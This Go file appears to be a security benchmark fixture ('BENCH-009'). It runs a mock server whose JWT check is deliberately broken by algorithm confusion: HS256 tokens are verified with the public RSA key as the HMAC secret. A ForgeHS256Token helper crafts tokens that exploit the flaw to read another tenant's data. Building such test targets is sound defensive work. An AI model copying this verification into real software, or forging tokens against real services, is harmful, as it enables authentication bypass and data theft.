package benchmark

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
)

const MockRSAPublicKey = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAy1f+7T7t9b5F
-----END PUBLIC KEY-----`

// TokenConfusionApp represents BENCH-009: an app vulnerable to JWT algorithm confusion (RS256 vs HS256).
type TokenConfusionApp struct {
	mu           sync.Mutex
	server       *httptest.Server
	tenantData   map[string]string
	requestCount int
}

// NewTokenConfusionApp starts the benchmark app.
func NewTokenConfusionApp() *TokenConfusionApp {
	app := &TokenConfusionApp{
		tenantData: map[string]string{
			"tenant_attacker": "Welcome Attacker! Benign public data.",
			"tenant_victim":   "CONFIDENTIAL_M&A_ASSET_VALUATION: $8.4B [RESTRICTED TO VICTIM CORP]",
		},
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/health", app.handleHealth)
	mux.HandleFunc("/api/v1/auth/public_key", app.handlePublicKey)
	mux.HandleFunc("/api/v1/tenant/data", app.handleTenantData)

	app.server = httptest.NewServer(mux)
	return app
}

// URL returns the test server URL.
func (a *TokenConfusionApp) URL() string {
	return a.server.URL
}

// Close terminates the mock server.
func (a *TokenConfusionApp) Close() {
	a.server.Close()
}

func (a *TokenConfusionApp) handleHealth(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{
		"status":  "healthy",
		"service": "token-gateway-service",
	})
}

func (a *TokenConfusionApp) handlePublicKey(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]string{
		"public_key": MockRSAPublicKey,
		"algorithm":  "RS256",
	})
}

// handleTenantData verifies the JWT token.
// PLANTED FLAW: If token header specifies alg: HS256, it uses the RSA public key string as the HMAC secret!
func (a *TokenConfusionApp) handleTenantData(w http.ResponseWriter, r *http.Request) {
	authHeader := r.Header.Get("Authorization")
	if !strings.HasPrefix(authHeader, "Bearer ") {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}
	rawToken := strings.TrimPrefix(authHeader, "Bearer ")
	parts := strings.Split(rawToken, ".")
	if len(parts) != 3 {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	headerJSON, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	payloadJSON, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	var header struct {
		Alg string `json:"alg"`
	}
	if err := json.Unmarshal(headerJSON, &header); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	var claims struct {
		TenantID string `json:"tenant_id"`
		Role     string `json:"role"`
	}
	if err := json.Unmarshal(payloadJSON, &claims); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	// Vulnerable verification: if HS256, uses the public key string as secret key
	if header.Alg == "HS256" {
		mac := hmac.New(sha256.New, []byte(MockRSAPublicKey))
		mac.Write([]byte(parts[0] + "." + parts[1]))
		expectedSig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))

		if parts[2] != expectedSig {
			w.WriteHeader(http.StatusForbidden)
			_ = json.NewEncoder(w).Encode(map[string]string{"error": "invalid signature"})
			return
		}
	} else if header.Alg == "RS256" {
		// Mock valid RS256 token for attacker
		if claims.TenantID != "tenant_attacker" {
			w.WriteHeader(http.StatusForbidden)
			_ = json.NewEncoder(w).Encode(map[string]string{"error": "invalid asymmetric key for victim tenant"})
			return
		}
	} else {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	// Return tenant data
	a.mu.Lock()
	data, ok := a.tenantData[claims.TenantID]
	a.mu.Unlock()

	if !ok {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{
		"tenant_id":       claims.TenantID,
		"data":            data,
		"verified_via_alg": header.Alg,
	})
}

// ForgeHS256Token is a test helper that crafts a forged token exploiting algorithm confusion.
func ForgeHS256Token(tenantID, role, publicKey string) string {
	header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))
	payload := base64.RawURLEncoding.EncodeToString([]byte(fmt.Sprintf(`{"tenant_id":%q,"role":%q}`, tenantID, role)))

	unsigned := header + "." + payload
	mac := hmac.New(sha256.New, []byte(publicKey))
	mac.Write([]byte(unsigned))
	signature := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))

	return unsigned + "." + signature
}
